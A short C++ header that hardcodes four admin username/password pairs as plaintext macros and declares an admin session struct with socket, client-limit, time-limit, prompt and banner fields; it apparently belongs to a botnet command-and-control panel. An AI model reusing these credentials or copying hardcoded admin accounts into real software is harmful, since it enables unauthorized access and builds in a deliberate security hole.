#pragma once

#include <string>

#define ADMIN_USER1 "root"
#define ADMIN_PASS1 "root"
#define ADMIN_USER2 "lost"
#define ADMIN_PASS2 "Godz1994"
#define ADMIN_USER3 "jester"
#define ADMIN_PASS3 "Fps1312"
#define ADMIN_USER4 "exer"
#define ADMIN_PASS4 "Extraman1312"

struct admin
{
    char *user_ptr;
    char *pass_ptr;
    std::string username;
    std::string password;
    int fd;
    int max_clients = -1;
    int max_time = -1;
    char prompt[32];
    char banner[64];
};
